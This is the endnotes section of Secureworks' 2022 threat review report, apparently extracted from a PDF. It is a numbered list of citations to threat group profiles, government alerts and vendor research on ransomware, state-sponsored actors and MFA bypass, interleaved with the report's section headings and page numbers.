BRONZE PRESIDENT threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
bronze\-president

Defense Evasion Offers Its 
Own Detection Opportunities

53 

54 

55 

56 

57 

BRONZE PRESIDENT Targets Russian Speakers with 
Updated PlugX, Secureworks. 
https://www.secureworks.com/blog/bronze\-president\-
targets\-russian\-speakers\-with\-updated\-plugx

Conclusion

BRONZE UNIVERSITY threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
bronze\-university

The Secureworks 
View of the Threat

ShadowPad Malware Analysis, Secureworks. 
https://www.secureworks.com/research/shadowpad\-malware\-
analysis

COBALT ULSTER threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
Cobalt\-ulster

Iranian intel cyber suite of malware uses open\-source 
tools, U.S. Cyber Command, accessed 7/28/22\. 
https://www.cybercom.mil/Media/News/Article/2897570/
iranian\-intel\-cyber\-suite\-of\-malware\-uses\-open\-source\-tools/

58 

59 

Taking Action Against Hackers in Iran, Meta, accessed 
7/282//. 
https://about.fb.com/news/2021/07/taking\-action\-against\-
hackers\-in\-iran/

COBALT FIRESIDE threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
cobalt\-fireside

60 Media Coverage Doesn't Deter Actor From Threatening 

Democratic Voters, Proofpoint, accessed 7/28/22\. 
https://www.proofpoint.com/us/blog/threat\-insight/media\-
coverage\-doesnt\-deter\-actor\-threatening\-democratic\-voters

61 

62 

63 

64 

65 

66 

67 

68 

69 

70 

71 

COBALT MIRAGE Conducts Ransomware Operations in 
U.S., Secureworks. 
https://www.secureworks.com/blog/cobalt\-mirage\-conducts\-
ransomware\-operations\-in\-us

Espionage Campaign Targets Telecoms Organizations 
across Middle East and Asia, Symantec, accessed 
7/28/22\. 
https://symantec\-enterprise\-blogs.security.com/blogs/threat\-
intelligence/espionage\-campaign\-telecoms\-asia\-middle\-east

COBALT FOXGLOVE threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
cobalt\-foxglove

COBALT AGORA threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
cobalt\-agora

COBALT LYCEUM threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
cobalt\-lyceum

Evolving trends in Iranian threat actor activity \- 
MSTIC presentation at CyberWarCon 2021, Microsoft, 
accessed 7/28/22\. 
https://www.microsoft.com/security/blog/2021/11/16/
evolving\-trends\-in\-iranian\-threat\-actor\-activity\-mstic\-
presentation\-at\-cyberwarcon\-2021/

Log4j2 In The Wild \| Iranian\-Aligned Threat Actor 
"TunnelVision" Actively Exploiting VMware Horizon, 
SentinelOne, accessed 7/28/22\. 
https://www.sentinelone.com/labs/log4j2\-in\-the\-wild\-iranian\-
aligned\-threat\-actor\-tunnelvision\-actively\-exploiting\-vmware\-
horizon/

COBALT ILLUSION threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
cobalt\-illusion

Iranian Government\-Sponsored APT Cyber Actors 
Exploiting Microsoft Exchange and Fortinet 
Vulnerabilities in Furtherance of Malicious Activities, 
CISA, accessed 7/28/22\. 
https://www.cisa.gov/uscert/ncas/alerts/aa21\-321a

COBALT SHADOW threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
cobalt\-shadow

COBALT SAPLING threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
cobalt\-sapling

72 

73 

74 

75 

76 

77 

78 

79 

80 

81 

82 

83 

84 

85 

Uncovering MosesStaff techniques: Ideology over 
Money, Check Point, accessed 7/28/22\. 
https://research.checkpoint.com/2021/mosesstaff\-targeting\-
israeli\-companies/

StrifeWater RAT: Iranian APT Moses Staff Adds New 
Trojan to Ransomware Operations, Cybereason, 
accessed 7/28/22\. 
https://www.cybereason.com/blog/research/strifewater\-rat\-
iranian\-apt\-moses\-staff\-adds\-new\-trojan\-to\-ransomware\-
operations

Russian Law Enforcement Take Down Several 
Cybercrime Forums, Security Week, accessed 7/29/22\. 
https://www.securityweek.com/russian\-law\-enforcement\-
take\-down\-several\-cybercrime\-forums

NotPetya Campaign: What We Know About the Latest 
Global Ransomware Attack, Secureworks. 
https://www.secureworks.com/blog/notpetya\-campaign\-
what\-we\-know\-about\-the\-latest\-global\-ransomware\-attack

Russia behind cyber\-attack with Europe\-wide impact 
an hour before Ukraine invasion, GOV.UK, accessed 
7/28/22\. 
https://www.gov.uk/government/news/russia\-behind\-cyber\-
attack\-with\-europe\-wide\-impact\-an\-hour\-before\-ukraine\-
invasion

News, CERT\-UA. 
https://cert.gov.ua/articles

Cyber attack of the Sandworm group (UAC\-0082\) 
on the energy facilities of Ukraine using malicious 
programs INDUSTROYER2 and CADDYWIPER (CERT\-
UA\#4435\), CERT\-UA, accessed 7/28/22\. 
https://cert.gov.ua/article/39518

Mass distribution of the JesterStealer malware using 
the theme of a chemical attack (CERT\-UA\#4625\), CERT\-
UA, accessed 7/28/22\. 
https://cert.gov.ua/article/40135

CERT\-UA, Facebook, accessed 7/28/22\. 
https://www.facebook.com/UACERT/posts/312939130865352

MOONSCAPE threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
moonscape

Cyber attacks by groups associated with China against 
Russian scientific and technical enterprises and state 
bodies (CERT\-UA\#4860\), CERT\-UA, accessed 7/28/22\. 
https://cert.gov.ua/article/375404

IRON TILDEN threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
iron\-tilden

IRON LIBERTY threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
iron\-liberty

IRON HUNTER threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
iron\-hunter 

69

2022 State of the Threat: A Year in Review06070801020304050607080986 

IRON HEMLOCK threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
iron\-hemlock

87 

IRON RITUAL threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
iron\-ritual

Letter From Our CTIO

88 

89 

IRON TWILIGHT threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
iron\-twilight

Executive Summary 
and Key Findings

IRON VIKING threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
iron\-viking

90 

Ransomware Remains the 
Primary Strategic Threat

NICKEL ACADEMY threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
nickel\-academy

91 

92 

93 

94 

95 

96 

Lazarus Targets Chemical Sector, Symantec, accessed 
7/28/22\. 
https://symantec\-enterprise\-blogs.security.com/blogs/threat\-
intelligence/lazarus\-dream\-job\-chemical

Ransomware Enablers: 
Loaders and Infostealers

NICKEL KIMBALL threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
nickel\-kimball

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

North Korean Hackers Have Prolific Year as Their 
Unlaundered Cryptocurrency Holdings Reach All\-time 
High, Chainalysis, accessed 7/28/22\. 
https://blog.chainalysis.com/reports/north\-korean\-hackers\-
have\-prolific\-year\-as\-their\-total\-unlaundered\-cryptocurrency\-
holdings\-reach\-all\-time\-high/

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

NICKEL GLADSTONE threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
nickel\-gladstone

TraderTraitor: North Korean State\-Sponsored APT 
Targets Blockchain Companies, CISA, accessed 7/28/22\. 
https://www.cisa.gov/uscert/ncas/alerts/aa22\-108a

Defense Evasion Offers Its 
North Korea Designation Update, U.S. Department of 
Own Detection Opportunities
the Treasury, accessed 7/28/22\. 
https://home.treasury.gov/policy\-issues/financial\-sanctions/
recent\-actions/20220414

97 

Conclusion

BRONZE BUTLER threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
bronze\-butler

98 

The Secureworks 
View of the Threat

Defeating APT10 compiler\-level obfuscations, Virus 
Bulletin, accessed 7/28/22\. 
https://www.virusbulletin.com/conference/vb2019/abstracts/
defeating\-apt10\-compiler\-level\-obfuscations/

99 

GuLoader: Peering Into a Shellcode\-based Downloader, 
Crowdstrike, accessed 7/28/22\. 
https://www.crowdstrike.com/blog/guloader\-malware\-
analysis/

100 GOLD DUPONT threat group profile, Secureworks.
https://www.secureworks.com/research/threat\-profiles/
GOLD\-DUPONT

101 

THREAT ALERT: Raspberry Robin Worm Abuses 
Windows Installer and QNAP Devices, Cybereason, 
accessed 7/28/22\. 
https://www.cybereason.com/blog/threat\-alert\-raspberry\-
robin\-worm\-abuses\-windows\-installer\-and\-qnap\-devices

102 ODBCCONF.EXE, Microsoft, accessed 8/4/22\. 

https://docs.microsoft.com/en\-us/sql/odbc/odbcconf\-
exe?view\=sql\-server\-ver16

103 BRONZE ATLAS threat group profile, Secureworks. 
https://www.secureworks.com/research/threat\-profiles/
bronze\-atlas

104 AUTHENTICODE (I): UNDERSTANDING WINDOWS 
AUTHENTICODE, RME, accessed 7/28/22\. 
https://reversea.me/index.php/authenticode\-i\-understanding\-
windows\-authenticode/

105 Microsoft Security Bulletin MS13\-098 \- Critical, 

Microsoft, accessed 7/28/22\. 
https://docs.microsoft.com/en\-us/security\-updates/
securitybulletins/2013/ms13\-098

106 Microsoft Security Advisory 2915720, Microsoft, 

accessed 7/28/22\. 
https://docs.microsoft.com/en\-us/security\-updates/
securityadvisories/2014/2915720

107 

108 

Russian State\-Sponsored Cyber Actors Gain Network 
Access by Exploiting Default Multifactor Authentication 
Protocols and “PrintNightmare” Vulnerability, CISA, 
accessed 8/1/22\. 
https://www.cisa.gov/uscert/ncas/alerts/aa22\-074a

Lapsus$ and SolarWinds hackers both use the same old 
trick to bypass MFA, Ars Technica, accessed 7/28/22\. 
https://arstechnica.com/information\-technology/2022/03/
lapsus\-and\-solar\-winds\-hackers\-both\-use\-the\-same\-old\-trick\-
to\-bypass\-mfa/

109 Catching Transparent Phish: Analyzing and Detecting 

MITM Phishing Toolkits, Stony Brook University and Palo 
Alto, accessed 7/28/22\. 
https://catching\-transparent\-phish.github.io/catching\_
transparent\_phish.pdf

110 Clever phishing method bypasses MFA using Microsoft 

WebView2 apps, Bleeping Computer, accessed 7/28/22\. 
https://www.bleepingcomputer.com/news/security/clever\-
phishing\-method\-bypasses\-mfa\-using\-microsoft\-webview2\-
apps/

111 

112 

MITRE ATT\&CK(r) Navigator. 
https://mitre\-attack.github.io/attack\-navigator/

OS Credential Dumping, MITRE ATT\&CK(r). 
https://attack.mitre.org/techniques/T1003/

70

2022 State of the Threat: A Year in Review060708010203040506070809Letter From Our CTIO

Executive Summary 
and Key Findings

Ransomware Remains the 
Primary Strategic Threat

Ransomware Enablers: 
Loaders and Infostealers

About Secureworks

Secureworks® (NASDAQ: SCWX) is a global cybersecurity leader that protects customer 

Exploitation of Remote 
Services is Now the Most 
Common Access Vector

progress with Secureworks® Taegis™, a cloud\-native security analytics platform built on 20\+ years 

of real\-world threat intelligence and research, improving customers’ ability to detect advanced 

threats, streamline and collaborate on investigations, and automate the right actions.

Hostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus

Defense Evasion Offers Its 
Own Detection Opportunities

For more information, call 1\-877\-838\-7947 to speak to a 

Secureworks security specialist or visit secureworks.com

Conclusion

The Secureworks 
View of the Threat

Availability varies by region. ©2022 SecureWorks, Inc. All rights reserved.

71

2022 State of the Threat: A Year in Review060708010203040506070809